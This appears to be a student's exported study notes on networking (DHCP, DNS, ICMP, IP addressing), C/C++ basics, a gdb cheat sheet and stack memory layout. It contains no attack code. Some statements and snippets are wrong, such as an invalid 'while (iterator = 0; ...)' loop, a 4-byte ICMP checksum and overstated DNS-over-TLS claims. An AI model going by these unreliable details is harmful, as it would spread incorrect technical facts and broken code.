<li>Information includes <em>offered</em> client IP, client address (the MAC Address), the subnet mask, lease period, and the Server IP.</li>
</ul>
<h3 id="request-from-the-client"><a class="header" href="#request-from-the-client">Request from the Client</a></h3>
<ul>
<li>A <strong>DHCPREQUEST</strong> message is sent to the server requesting the offered address.</li>
<li>Only one offer is requested if multiple servers offer it IPs.</li>
<li>Before claiming, an Address Resolution Protocol request is broadcast on the subnet. No response means there are no conflicting IPs.</li>
</ul>
<h3 id="acknowledgement"><a class="header" href="#acknowledgement">Acknowledgement</a></h3>
<ul>
<li><strong>DHCPACK</strong> sent by the server.</li>
<li>Includes lease duration and other requested information.</li>
<li>ARP is conducted (again). If conflicting, <strong>DHCPDECLINE</strong> is sent.</li>
</ul>
<h3 id="releasing"><a class="header" href="#releasing">Releasing</a></h3>
<ul>
<li>Request to release the DHCP information and the client deactivates its IP address.</li>
<li>Not mandatory as it’s not known when the user would disconnect all of a sudden.</li>
</ul>
<h2 id="ipv6"><a class="header" href="#ipv6">IPv6</a></h2>
<p>IPv6 protocol differs significantly for it to be its own protocol. Read <a href="notes/dhcpv6.html">dhcpv6</a></p>
<!---->
<div style="break-before: page; page-break-before: always;"></div><h1 id="dhcpv6"><a class="header" href="#dhcpv6">dhcpv6</a></h1>
<ul>
<li>Fundamentally different from DHCP.</li>
<li>Still uses UDP.</li>
<li>Client listens on UDP port 546, servers and relay channels listen on port 547.</li>
</ul>
<h2 id="identifiers"><a class="header" href="#identifiers">Identifiers</a></h2>
<ul>
<li>DUID: Used by the client to get the IP address of the server.</li>
</ul>
<h2 id="example-of-operation"><a class="header" href="#example-of-operation">Example of operation</a></h2>
<p>In this example, without rapid-commit present, the server’s link-local address is <code>fe80::0011:22ff:fe33:5566</code> and the client’s link-local address is <code>fe80::aabb:ccff:fedd:eeff</code>.</p>
<ul>
<li>Client sends a solicit from <code>[fe80::aabb:ccff:fedd:eeff]:546</code> to multicast address <code>[ff02::1:2]:547</code>.</li>
<li>Server replies with an advertise from <code>[fe80::0011:22ff:fe33:5566]:547</code> to <code>[fe80::aabb:ccff:fedd:eeff]:546</code>.</li>
<li>Client replies with a request from <code>[fe80::aabb:ccff:fedd:eeff]:546</code> to <code>[ff02::1:2]:547</code>.</li>
<li>Server finishes with a reply from <code>[fe80::0011:22ff:fe33:5566]:547</code> to <code>[fe80::aabb:ccff:fedd:eeff]:546</code>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dns"><a class="header" href="#dns">dns</a></h1>
<p>DNS is the domain name system. It is a methodical
address-book kinda thing that returns the location of the nearest
server for that domain name.</p>
<p>It differs from a contact book in the sense that it can return the nearest
server instead of having a fixed server. In that sense,
it is like a <code>multimap</code> instead of a <code>map</code> if we talk about it in STL terms.</p>
<h2 id="domain-name-space-and-mode-of-operation"><a class="header" href="#domain-name-space-and-mode-of-operation">Domain Name Space and Mode of Operation</a></h2>
<p>The tree is separated into zones beginning with the root zone.
The first query is sent to the root zone that responds with
another zone that it thinks <em>may</em> have the <strong>record</strong> for the domain name.</p>
<p>This can continue recursively unless the request
receives an <strong>authoritative</strong> answer (AA bit in the responses set to 1).</p>
<p>The zones can be divided by creating many additional
zones and authority is <em>delegated</em> over to the child zones.
The parent ceases to be authoritative for the new zone.</p>
<p>This setup is obviously better than a single server
holding all the records for multiple reasons:</p>
<ul>
<li>Enables lower load on the servers</li>
<li>Enables faster lookup times.</li>
<li>Ease of adding new zones and new records without disturbing existing ones.</li>
</ul>
<h3 id="dns-resolvers"><a class="header" href="#dns-resolvers">DNS Resolvers</a></h3>
<p>Client side of the DNS is called a resolver.
It initiates and queries requests and can use a variety of methods
like <em>recursive</em>, <em>non-recursive</em> and <em>iterative</em>.
There are also caching DNS resolvers that do what you think they do;
they cache values locally and reduce lookup times and upstream loads.</p>
<p>A non-recursive resolver simply means that it will either get the
query response from an authoritative server or gives a partial result.</p>
<p>A recursive is the regular one, where a server
may generate more requests on behalf of the resolver.
An iterative server is one where the query responses lead it
to the next server in chain till it reaches an authoritative one.</p>
<p>An example of this is <a href="https://wiki.archlinux.org/title/Systemd-resolved">systemd-resolved</a>.
Typically applications on linux check <code>/etc/resolv.conf</code> for checking domain
name servers for the network. <code>resolved.service</code> symlinks it to one of the two files,
<code>/run/systemd/resolve/stub-resolv.conf</code> or <code>/run/systemd/resolve/resolv.conf</code>.</p>
<p><code>stub-resolv</code> points to the local DNS <em>server</em> created by systemd.
It operates on 127.0.0.53.
Also, to set global DNS, you need to edit <code>/etc/systemd/resolved.conf</code>.</p>
<h2 id="domain-name-syntax-and-internationalization"><a class="header" href="#domain-name-syntax-and-internationalization">Domain Name syntax and internationalization</a></h2>
<ul>
<li>Divided into <em>labels</em> that are concatenated by dots.</li>
<li>The full domain name can have a total of 253 characters.</li>
<li>Each label represents a subdomain. The hierarchy descends from right to left.</li>
<li>It can have a maximum of 127 levels of divisions in the subdomains.</li>
<li>Each subdivision can have a total of 63 characters.</li>
<li>Can only contain letters, digits, and hyphens. This is called as the <strong>LDH</strong> rule.</li>
<li>They are interpreted in a case independent manner. Can’t start or end with hyphens either.</li>
<li>To map non-ascii characters to domain names <a href="https://wikiless.org/wiki/Punycode?lang=en">punycode</a> is used.</li>
</ul>
<h2 id="transport-protocols"><a class="header" href="#transport-protocols">Transport Protocols</a></h2>
<ul>
<li>UDP on port 53</li>
<li>TCP on port 53</li>
<li>TLS over port 853
<ul>
<li>More secure than DNS over HTTPS, as it encrypts not just browser traffic but all traffic.</li>
</ul>
</li>
<li>HTTPS over port 443
<ul>
<li>It appears to be regular HTTPS traffic but is actually easily filterable using <em>cough cough</em> machine learning models.</li>
</ul>
</li>
</ul>
<h3 id="dnssec"><a class="header" href="#dnssec">DNSSEC</a></h3>
<p>DNS security extension. It signs the DNS data of every zone use public key cryptography. The zone owner has the private key that is kept to himself. The public key is distributed along with the records.</p>
<p>If the signatures match, it means that the data obtained is authentic. The public key authenticity is maintained by signing it with the parent zone’s private key.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="enum_classes"><a class="header" href="#enum_classes">enum_classes</a></h1>
<p>Problems with regular enums:</p>
<ul>
<li>Two enums cannot have the same name.</li>
</ul>
<pre><code class="language-cpp">enum A {
    lmao,
    ass
};
enum B {
    lmao,
    ass
};
</code></pre>
<ul>
<li>
<p>Above example, no variable can have the names <code>lmao</code> and <code>ass</code>.</p>
</li>
<li>
<p>Also, two enums of different kinds can be compared (for some reason).</p>
</li>
</ul>
<h2 id="enum-classes"><a class="header" href="#enum-classes">Enum classes</a></h2>
<pre><code class="language-cpp">enum class Color {
red, blue, green
};
Color color = Color::blue;
</code></pre>
<p>We can also specify the underlying type, egg <code>char</code> or <code>int</code>.</p>
<pre><code class="language-cpp">enum class Color : char {
    // whatever
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file_descriptors"><a class="header" href="#file_descriptors">file_descriptors</a></h1>
<p>On *nix systems, file descriptors are a number that are given to files that have a stream attached to them. C can directly read and write from file descriptors using the <code>read()</code> command that takes a file descriptor, a buffer and a length to be read.</p>
<p>There are different file descriptors for every process. To get the file descriptors for the current process, run <code>ls -l /proc/$$/fd</code>.</p>
<blockquote>
<p><code>$$</code> is a substitute for the current process ID. Run <code>ps</code> and <code>echo $$</code> to compare.</p>
</blockquote>
<p>By standard, 0 is standard input, 1 is standard output, and 2 is standard error.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="functions-1"><a class="header" href="#functions-1">Functions</a></h1>
<p><code>int myfunc(int x); //function prototype / declaration</code></p>
<pre><code class="language-cpp">int myfunc(int a){
    //do some shit
    return val;
}
int main(){
    //do some shit
    int c = myfunc(b);
    //do some shit
}
</code></pre>
<p>Usually it is a good programming practice to have a header file that contains the definitions of functions used along with a comment gitving its function (pun intended), and a separate file containing the function itself (the function is not redefined unless you put a semicolon at its end).</p>
<blockquote>
<p>Format of a function: <code>return-value-type function-name(parameter-list);</code><br/>Parameter list is a comma separated list of values that have to be taken as input.</p>
</blockquote>
<p>We can return <code>void</code> from a function that doesn’t have to return a value, but just perform operations.</p>
<p>Arrays cannot be returned by a function unless the array is declared globally or passed as a heap allocated pointer.</p>
<p>To take an array as an input, simply pass the pointer to its first element and keep incrementing its pointer to access further elements. However, C performs no checks for illegal access if the pointer crosses the array length. It is a good practice for us to pass pointers to arrays along with their lengths as functions.</p>
<h2 id="default-arguments-for-functions"><a class="header" href="#default-arguments-for-functions">Default arguments for functions</a></h2>
<pre><code class="language-cpp">int func(int x = 6){
    return 2*x;
}

int main(){
    int y = func(); //gets value 12
    int z = func(7); //gets value 14
}
</code></pre>
<h2 id="pure-and-impure-functions"><a class="header" href="#pure-and-impure-functions">Pure and Impure functions</a></h2>
<p>Since C++ supports functions, <em>in theory</em>, it supports functional programming. In functional programming we have the notion of pure and impure functions. Pure functions are those that do not change the value of anything <strong>except</strong> for the parameters that are passed in them. On the other hand, impure functions are changinge values outside of the function’s scope. Do note that passing a pointer and dereferencing it to change its value is also an example of an impure function.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gdb"><a class="header" href="#gdb">gdb</a></h1>
<p>More important commands have a (*) by them.</p>
<h2 id="startup"><a class="header" href="#startup">Startup</a></h2>
<pre><code class="language-*% gdb object       normal debug">*% gdb object core 	core debug (must specify core file)
</code></pre>
<h2 id="help"><a class="header" href="#help">Help</a></h2>
<pre><code>*(gdb) help        	list command classes
</code></pre>
<h2 id="breakpoints"><a class="header" href="#breakpoints">Breakpoints</a></h2>
<pre><code>*(gdb) break main       set a breakpoint on a function
*(gdb) break 101        set a breakpoint on a line number
*(gdb) break basic.c:101        set breakpoint at file and line (or function)
*(gdb) info breakpoints        show breakpoints
*(gdb) delete 1         delete a breakpoint by number
</code></pre>
<h2 id="running-the-program"><a class="header" href="#running-the-program">Running the program</a></h2>
<pre><code>*(gdb) run        	run the program with current arguments
*(gdb) run args redirection        run with args and redirection
*(gdb) cont            continue the program
*(gdb) step            single step the program; step into functions
*(gdb) next            step but step over functions 
*(gdb) CTRL-C          actually SIGINT, stop execution of current program 
*(gdb) attach process-id        attach to running program
*(gdb) detach        detach from running program
*(gdb) finish        finish current function's execution
</code></pre>
<h3 id="stack-backtrace"><a class="header" href="#stack-backtrace">Stack backtrace</a></h3>
<pre><code>*(gdb) bt        	print stack backtrace
*(gdb) info locals      print automatic variables in frame
</code></pre>
<h2 id="browsing-source"><a class="header" href="#browsing-source">Browsing source</a></h2>
<pre><code>*(gdb) list 101        	list 10 lines around line 101
*(gdb) list 1,10        list lines 1 to 10
*(gdb) list main  	list lines around function 
*(gdb) list basic.c:main        list from another file basic.c
*(gdb) list -        	list previous 10 lines
</code></pre>
<h2 id="browsing-data"><a class="header" href="#browsing-data">Browsing Data</a></h2>
<pre><code>*(gdb) print expression        print expression, added to value history
*(gdb) print/x expressionR        print in hex
*(gdb) info locals      print local automatics only
*(gdb) ptype name        print type definition
*(gdb) set variable = expression        assign value
</code></pre>
<h2 id="miscellaneous"><a class="header" href="#miscellaneous">Miscellaneous</a></h2>
<pre><code>(gdb) define command ... end        define user command
*(gdb) RETURN        		repeat last command
*(gdb) shell command args       execute shell command 
*(gdb) source file        	load gdb commands from file
*(gdb) quit        		quit gdb
</code></pre>
<hr />
<h3 id="startup-1"><a class="header" href="#startup-1">Startup</a></h3>
<pre><code>% gdb -help         	print startup help, show switches
%% gdb object pid  	attach to running process
% gdb        		use file command to load object 
</code></pre>
<h3 id="help-1"><a class="header" href="#help-1">Help</a></h3>
<pre><code>(gdb) help running      list commands in one command class
(gdb) help run        	bottom-level help for a command "run" 
(gdb) help info         list info commands (running program state)
(gdb) help info line    help for a particular info command
(gdb) help show         list show commands (gdb state)
(gdb) help show commands        specific help for a show command
</code></pre>
<h3 id="breakpoints-1"><a class="header" href="#breakpoints-1">Breakpoints</a></h3>
<pre><code>(gdb) delete        	delete all breakpoints (prompted)
(gdb) clear             delete breakpoints at current line
(gdb) clear function    delete breakpoints at function
(gdb) clear line        delete breakpoints at line
(gdb) disable 2         turn a breakpoint off, but don't remove it
(gdb) enable 2          turn disabled breakpoint back on
(gdb) tbreak function|line        set a temporary breakpoint
(gdb) commands break-no ... end   set gdb commands with breakpoint
(gdb) ignore break-no count       ignore bpt N-1 times before activation
(gdb) condition break-no expression         break only if condition is true
(gdb) condition 2 i == 20         example: break on breakpoint 2 if i equals 20
(gdb) watch expression        set software watchpoint on variable
(gdb) info watchpoints        show current watchpoints
</code></pre>
<h3 id="running-the-program-1"><a class="header" href="#running-the-program-1">Running the program</a></h3>
<pre><code>(gdb) set args args...        set arguments for run 
(gdb) show args        show current arguments to run
(gdb) step count       singlestep \fIcount\fR times
(gdb) next count       next \fIcount\fR times
(gdb) kill           kill current executing program 
</code></pre>
<h3 id="stack-backtrace-1"><a class="header" href="#stack-backtrace-1">Stack Backtrace</a></h3>
<pre><code>(gdb) frame        	show current execution position
(gdb) up        	move up stack trace  (towards main)
(gdb) down        	move down stack trace (away from main)
(gdb) info args         print function parameters 
</code></pre>
<h3 id="browsing-source-1"><a class="header" href="#browsing-source-1">Browsing source</a></h3>
<pre><code>(gdb) list *0x22e4      list source at address
(gdb) cd dir        	change current directory to \fIdir\fR
(gdb) pwd          	print working directory
(gdb) search regexpr    forward current for regular expression
(gdb) reverse-search regexpr        backward search for regular expression
(gdb) dir dirname       add directory to source path
(gdb) dir        	reset source path to nothing
(gdb) show directories        show source path
</code></pre>
<h3 id="browsing-data-1"><a class="header" href="#browsing-data-1">Browsing Data</a></h3>
<pre><code>(gdb) print array[i]@count        artificial array - print array range
(gdb) print $        	print last value
(gdb) print *$-&gt;next    print thru list
(gdb) print $1        	print value 1 from value history
(gdb) print ::gx        force scope to be global
(gdb) print 'basic.c'::gx        global scope in named file (&gt;=4.6)
(gdb) print/x &amp;main     print address of function
(gdb) x/countFormatSize address        low-level examine command
(gdb) x/x &amp;gx        	print gx in hex
(gdb) x/4wx &amp;main       print 4 longs at start of \fImain\fR in hex
(gdb) x/gf &amp;gd1         print double
(gdb) help x        	show formats for x
(gdb) info functions regexp         print function names
(gdb) info variables  regexp        print global variable names
(gdb) whatis expression       print type of expression
(gdb) display expression        display expression result at stop
(gdb) undisplay        delete displays
(gdb) info display     show displays
(gdb) show values      print value history (&gt;= gdb 4.0)
(gdb) info history     print value history (gdb 3.5)
</code></pre>
<h3 id="object-file-manipulation"><a class="header" href="#object-file-manipulation">Object File manipulation</a></h3>
<pre><code>(gdb) file object      		load new file for debug (sym+exec)
(gdb) file             		discard sym+exec file info
(gdb) symbol-file object        load only symbol table
(gdb) exec-file object 		specify object to run (not sym-file)
(gdb) core-file core   		post-mortem debugging
</code></pre>
<h3 id="signal-control"><a class="header" href="#signal-control">Signal Control</a></h3>
<pre><code>(gdb) info signals        	print signal setup
(gdb) handle signo actions      set debugger actions for signal
(gdb) handle INT print          print message when signal occurs
(gdb) handle INT noprint        don't print message
(gdb) handle INT stop        	stop program when signal occurs
(gdb) handle INT nostop         don't stop program
(gdb) handle INT pass        	allow program to receive signal
(gdb) handle INT nopass         debugger catches signal; program doesn't
(gdb) signal signo        	continue and send signal to program
(gdb) signal 0        		continue and send no signal to program
</code></pre>
<h3 id="machine-level-debug"><a class="header" href="#machine-level-debug">Machine-level Debug</a></h3>
<pre><code>(gdb) info registers        	print registers sans floats
(gdb) info all-registers        print all registers
(gdb) print/x $pc        	print one register
(gdb) stepi        		single step at machine level
(gdb) si        		single step at machine level
(gdb) nexti        		single step (over functions) at machine level
(gdb) ni        		single step (over functions) at machine level
(gdb) display/i $pc        	print current instruction in display
(gdb) x/x &amp;gx        		print variable gx in hex
(gdb) info line 22        	print addresses for object code for line 22
(gdb) info line *0x2c4e         print line number of object code at address
(gdb) x/10i main        	disassemble first 10 instructions in \fImain\fR
(gdb) disassemble addr          dissassemble code for function around addr
</code></pre>
<h3 id="history-display"><a class="header" href="#history-display">History Display</a></h3>
<pre><code>(gdb) show commands        	print command history (&gt;= gdb 4.0)
(gdb) info editing       	print command history (gdb 3.5)
(gdb) ESC-CTRL-J        	switch to vi edit mode from emacs edit mode
(gdb) set history expansion on       turn on c-shell like history
(gdb) break class::member       set breakpoint on class member. may get menu
(gdb) list class::member        list member in class
(gdb) ptype class               print class members
(gdb) print *this        	print contents of this pointer
(gdb) rbreak regexpr     	useful for breakpoint on overloaded member name
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hacking_basics"><a class="header" href="#hacking_basics">hacking_basics</a></h1>
<h2 id="how-the-internet-works"><a class="header" href="#how-the-internet-works">How the Internet Works</a></h2>
<p><a href="https://github.com/InternetHealthReport/gsoc/blob/main/ihr-contributor-handbook.md">Internet Health Report</a></p>
<h2 id="code-execution-important-details"><a class="header" href="#code-execution-important-details">Code Execution Important Details</a></h2>
<p><img src="notes/./hacking/memory-organization.jpg" alt="Memory Organisation" /></p>
<ul>
<li>On the top of the memory space is the <code>kernel</code>, the literal system of the computer and also the place where environment variables and command line arguements are stored.</li>
<li>At the bottommost we have the <code>code segment</code>, the raw bits and bytes of the program which is read-only. Write in it and boom, memory violation.</li>
<li>Above the code segments are the <code>Data</code> and the <code>BSS</code> segments. They contain initialized and unintialized global variables respectively.</li>
<li>Above that is the <code>heap</code> used for dynamic memory allocation. Values stored in <code>heap</code> grow upwards.</li>
<li>After that comes the stack. It starts from the top and moves towards the bottom. Most buffer overflows happen in this region. The top of the stack (which is at the bottom of the memory space in stack) is tracked by the stack pointer. The bottom of the stack is where the interesting stuff happens.</li>
</ul>
<h2 id="how-a-main-function-is-executed"><a class="header" href="#how-a-main-function-is-executed">How a main function is executed:</a></h2>
<ol>
<li>Base Pointer is pushed to the stack.</li>
<li>Stack pointer value is copied to the base pointer.</li>
<li>Rn both base pointer and stack pointer point to the top of the stack.</li>
<li>The stack pointer is subtracted from and sent into a lower memory location if there are function calls.</li>
<li>The variables are added to a value offset from the last variable (initially from the base pointer) according to their size.</li>
</ol>
<h2 id="assembly-basics"><a class="header" href="#assembly-basics">Assembly Basics</a></h2>
<p>The processor supports the following data types:</p>
<ul>
<li><code>Word</code>: 2 byte structure</li>
<li><code>Doubleword</code>: 4 byte structure</li>
<li><code>Quadword</code>: 8 byte structure</li>
<li><code>Paragraph</code>: 16 byte structure</li>
</ul>
<h3 id="operation-suffixes"><a class="header" href="#operation-suffixes">Operation Suffixes</a></h3>
<p>GAS assembly instructions are generally suffixed with the letters “b”, “s”, “w”, “l”, “q” or “t” to determine what size operand is being manipulated.</p>
<ul>
<li><code>b</code> = byte (8 bit).</li>
<li><code>s</code> = single (32-bit floating point).</li>
<li><code>w</code> = word (16 bit).</li>
<li><code>l</code> = long (32 bit integer or 64-bit floating point).</li>
<li><code>q</code> = quad (64 bit).</li>
<li><code>t</code> = ten bytes (80-bit floating point).</li>
</ul>
<p>If the suffix is not specified, and there are no memory operands for the instruction, GAS infers the operand size from the size of the destination register operand (the final operand).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="icmp"><a class="header" href="#icmp">icmp</a></h1>
<p>Used by network devices such as routers to send error messages back. Typically used for network diagnostic tools such as <a href="notes/traceroute.html">traceroute</a>.</p>
<ul>
<li>
<p>If the time to live (TTL) reaches 0 at any node (each node that processes TTL decrements it by 1), then the packet is discarded and the <strong>ICMP tile exceeded in transit</strong> is sent back to the source.</p>
</li>
<li>
<p>The header contains a 1 byte <em>type</em>, 1 byte <em>code</em>, 2 byte <em>checksum</em>, and 4 bytes for rest of the header.</p>
</li>
</ul>
<h2 id="control-codes"><a class="header" href="#control-codes">Control Codes:</a></h2>
<ul>
<li>
<p>Redirect: Asks the sender to send the traffic through some other node in the network.</p>
<ul>
<li>The code contains the reason for which the Redirect was done.</li>
<li>The next 4 bytes contain the IP address where it must be redirected.</li>
<li>Following data contains the IP header and the first 8 bytes of the OG datagram for verification by the source.</li>
<li>Type = 5</li>
</ul>
</li>
<li>
<p>Time exceeded: Quite literally. Code can specify why time limit exceeded, in transit or in fragment reassembly.</p>
<ul>
<li>Type = 11</li>
</ul>
</li>
<li>
<p>Timestamp: Used for time sync. Type = 13, code = 0.</p>
<ul>
<li>Identifier and Sequence number, 2 bytes each, are used to match the request with the reply.</li>
<li>Has 3 4 byte Timestamps, <code>orginate</code> when this was sent, and the other two are not used.</li>
</ul>
</li>
<li>
<p>Timestamp reply: Quite literally. Type = 14, Code = 0.</p>
<ul>
<li>Identifier and sequence number as before.</li>
<li>Same Timestamp format, first one is when the timestamp was sent by the other party, second one was when it was received by us, third one was when the reply was sent.</li>
</ul>
</li>
<li>
<p>Destination unreachable: Can have 15 different codes. Never sent for IP Multicast.</p>
<ul>
<li>Type = 3.</li>
<li>Code field can be 0 - 15.</li>
<li>Checksum ( 4 bytes)</li>
<li>next 4 bytes are unused.</li>
<li>Next 4 bytes are only relevant for a specific error when packet fragmentation is required but <strong>DONT FRAGMENT</strong> flag is active.</li>
<li>After that IP header and first 8 bytes of datagram data for senders verification.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="if-else-1"><a class="header" href="#if-else-1"><code>if-else</code></a></h2>
<pre><code class="language-cpp">if(expr){statements}
else{statements}
</code></pre>
<p>Multiple <code>if-else</code> can be chained together.</p>
<pre><code class="language-cpp">if(expr){statements}
else if(expr){statements}
else if(expr){statements}
</code></pre>
<p>syntactic sugar for <code>if else</code>:  <code>expr ? output if true : output if false</code></p>
<blockquote>
<p>short circuiting: if the first statement in an <code>&amp;&amp;</code> structure is false, then the second statement is not evaluated. similarly, if the first statement in an <code>||</code> structure is true, the second statement is not evaluated.</p>
</blockquote>
<blockquote>
<p>dangling <code>else</code>: an <code>else</code> is related to the closest <code>if</code> unless brackets <code>{}</code> are used.</p>
</blockquote>
<h3 id="switch-case-1"><a class="header" href="#switch-case-1"><code>switch-case</code></a></h3>
<p>only for equality and integers\characters (used as ascii values)</p>
<pre><code class="language-cpp">scanf("%d",&amp;isd);
switch (isd){
    case 91: printf("india\n"); break;
    case 1: printf("us-canada\n"); break;
    case 61: printf("astralia\n"); break;
    default: printf("india\n"); 
}
</code></pre>
<blockquote>
<p>Switch case is primarily used for enum types but since enums can be freely typecasted to int we can use that as well.</p>
</blockquote>
<div class="epigraph">
<blockquote><p> A computer is like air conditioning - it becomes useless when you open Windows.</p>
<footer>Linus Torvalds</footer></blockquote>
</div>
<h2 id="iterators"><a class="header" href="#iterators">Iterators</a></h2>
<h3 id="for-loops"><a class="header" href="#for-loops">For loops</a></h3>
<pre><code class="language-cpp">int main(){
    int count = 1
    for(int i = 0; i &lt; count; i++){
        printf("%d",i);
    }
}
</code></pre>
<p>The shortest <code>for</code> loop is <code>for(;;){}</code> which does nothing.</p>
<p>There can be multiple values and multiple conditions. A for loop can also be written as follows:</p>
<pre><code class="language-cpp">int main(){
    int stud = 0, NSTUD = 10;
    for(;;){
        if (stud &lt; NSTUD){
            printf("%d",stud);
            stud++;
            continue;
        }
        break;
    }
}
</code></pre>
<p>Loops can also be nested as usual.</p>
<p>We also have the following syntax for a <strong>for</strong> loop.</p>
<pre><code class="language-cpp">int v[5] = {1,2,3,4,5};
for (int x: v){ //take x that varies from first value of v to the last value of v
    cout &lt;&lt; x;
}

for (int &amp;x: v){ //take them as a reference this time so that values can be modified
    x++;
}
</code></pre>
<h3 id="while-loops"><a class="header" href="#while-loops">While loops</a></h3>
<pre><code class="language-cpp">int main(){
    int iterator;
    while (iterator = 0; /*some condition*/){
        //do some shit
        iterator++;
    }
}
</code></pre>
<p>This can also be written as</p>
<pre><code class="language-cpp">int main(){
    int iterator = 0;
    while (iterator++ &lt;= 10){
        //do some shit
    }
}
</code></pre>
<p>This utilises the properties of postincrement operator.</p>
<ul>
<li>iterator cannot be declared inside <code>while</code></li>
<li><code>for</code> and <code>while</code> are the same in backend</li>
</ul>
<h3 id="do-while-loop"><a class="header" href="#do-while-loop">Do-while loop</a></h3>
<p>It is possible the while doesn’t even execute once. Use do while if the first iteration is known to happen in all scenarios.</p>
<pre><code class="language-cpp">int main(){
    int iterator = 0;
    do{
        //do some shit
        iterator++;
    } while (iterator != 0);
}
</code></pre>
<p>If an equivalent <code>while</code> loop would have been written it would have never executed.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="io"><a class="header" href="#io">IO</a></h1>
<p><code>iostream</code> is the header file responsible for input and output. <code>std</code> is the namespace for <code>cout</code> object which is <strong>normally</strong> connected to the screen. <code>&lt;&lt;</code> is the <em>stream insertion operator</em>. <code>endl</code> is equivalent to <code>'\n' &lt;&lt; flush</code>. What this basically means is that a newline escape character is inserted into the stream and the output that was buffered in the memory was expelled onto the the screen.</p>
<blockquote>
<p>C++ buffers it because printing is an expensive task for memory and CPU.</p>
</blockquote>
<p>There is another function called <code>getline</code> that takes 1 (optionally 2 or 3) arguments. The basic function signature is as follows. It is a part of the <code>string</code> header, as opposed to the <code>iostream</code> header.</p>
<pre><code>getline(istream&amp; stream, str&amp; s, char delim);
</code></pre>
<p>By default, the stream selected is the default input output stream but it can be a file stream as well.</p>
<p>A simple example:</p>
<pre><code class="language-cpp">#include &lt;iostream&gt;
#include &lt;string&gt;

int main(){
    string s;
    getline(cin, s, '$'); 
    // takes input from cin, saves it in s and stops when `$` is reached
}
</code></pre>
<p>There exists another variant that is a method for <code>cin</code> (Don’t worry about what a method is rn, it’ll be covered later).</p>
<pre><code class="language-cpp">#include &lt;iostream&gt;
#include &lt;string&gt;

int main(){
    string s;
    int MAX_LEN = 6;
    cin.getline(s, MAX_LEN, '$');
    // by default the delimiter is '\n'
}
</code></pre>
<p>This variant only takes input till the specified length. If the length is crossed the program execution stops. If the length is not specified then the entire input till the delimiter is taken.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ipv4"><a class="header" href="#ipv4">ipv4</a></h1>
<ul>
<li>32 bit addresses divided into 8 bit blocks.</li>
<li>Has private address range and multicast address range.</li>
</ul>
<h2 id="classful-networking"><a class="header" href="#classful-networking">Classful networking</a></h2>
<ul>
<li>0xxxxxxx.x.x.x is one network. Called class A.
<ul>
<li>Has 128 possible networks. Size of network is 2<sup>24</sup></li>
<li>Has subnet mask equal to 8.</li>
</ul>
</li>
<li>Similarly 10xxxxxx.x.x.x is another network. Class B.
<ul>
<li>Has 2<sup>14</sup> networks. Network size decreases inversely.</li>
<li>Has subnet mask equal to 16.
-Similarly class C has subnet of 24.</li>
</ul>
</li>
<li>Only allowed for 254 networks.</li>
</ul>
<blockquote>
<p>Fun fact: ARPAnet was 10.x.x.x</p>
</blockquote>
<h2 id="private-address-range"><a class="header" href="#private-address-range">private address range</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Block Size</th><th>Range</th><th>Bit mask</th><th>Classful description</th></tr></thead><tbody>
<tr><td>24-bit</td><td>10.0.0.0 - 10.255.255.255</td><td>8</td><td>One class A network</td></tr>
<tr><td>20 bit</td><td>172.16.0.0 - 172.31.255.255</td><td>12</td><td>16 contiguous class B networks</td></tr>
<tr><td>12 bit</td><td>192.168.0.0 - 192.168.255.255</td><td>16</td><td>256 contiguous class C networks</td></tr>
</tbody></table>
</div>
<h3 id="loopback-interface"><a class="header" href="#loopback-interface">Loopback interface</a></h3>
<ul>
<li>Special case of private addresses.</li>
<li>Packets never leave the host.</li>
<li>127.0.0.0/8 is the address space reserved for ipv4.</li>
</ul>
<h3 id="ip-broadcast"><a class="header" href="#ip-broadcast">IP Broadcast</a></h3>
<ul>
<li>In IPv4 it has a special address. This was used by interfaces to send messages to all networks connected to a particular subnet.</li>
<li>In <a href="notes/dhcp.html#server-discovery">dhcp</a>, if the broadcast address of the subnet is not defined, then a <strong>DHCPDISCOVER</strong> message is sent to the address <em>255.255.255.255</em>.</li>
<li>This again does the same job of keeping the broadcast message within the same subnet.</li>
<li>The broadcast address is otherwise calculated as follows: - Take the first <em>subnet</em> bits of the network. Let them be as they are. - Change the remaining trailing bits to 1.</li>
</ul>
<!---->
<h2 id=""><a class="header" href="#"></a></h2>
<ul>
<li><a href="notes/2023-09-25.html">2023-09-25</a>
<ul>
<li>Checking the script by linking <a href="notes/ipv4.html">ipv4</a>.</li>
</ul>
</li>
</ul>
<h2 id="-1"><a class="header" href="#-1"></a></h2>
<ul>
<li><a href="notes/tcp.html">tcp</a>
<ul>
<li>Transmission Control Protocol. Originated along with <a href="notes/ipv4.html">ipv4</a> and hence the entire system is called TC/IP.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ipv6-1"><a class="header" href="#ipv6-1">ipv6</a></h1>
<ul>
<li>Welp, <a href="notes/ipv4.html">ipv4</a> got over. So we needed more addresses.</li>
<li>128 bits. Much larger than 32 bits of ipv4.</li>
</ul>
<h2 id="multicasting"><a class="header" href="#multicasting">Multicasting</a></h2>
<ul>
<li>Unlike <a href="notes/ipv4.html">ipv4</a>, this doesn’t have a generic broadcast address for a subnet.</li>
<li>Just as IPv4 has <em>255.255.255.255</em> as the global subnet broadcast address, here the equivalent is <em>ff02::1</em>.</li>
<li>It is also possible to have a global multicast.</li>
<li>The first 64 bits are global address space (smallest subnet size).</li>
<li></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="jpeg"><a class="header" href="#jpeg">jpeg</a></h1>
<ul>
<li>It is actually a compression format.</li>
<li>Lossy compression.</li>
<li>Container for the file format is JFIF or EXIF.</li>
<li>JFIF is mutually incompatible with the EXIF format.</li>
<li>Has distinct SOI (start of image) and EOI (end of image).</li>
<li>Any image viewer checks the EOI and stops reading the image at that point. So you can have any data appended at the end of it. For linux it is as simple as <code>echo $DATA &gt;&gt; file.jpg</code></li>
</ul>
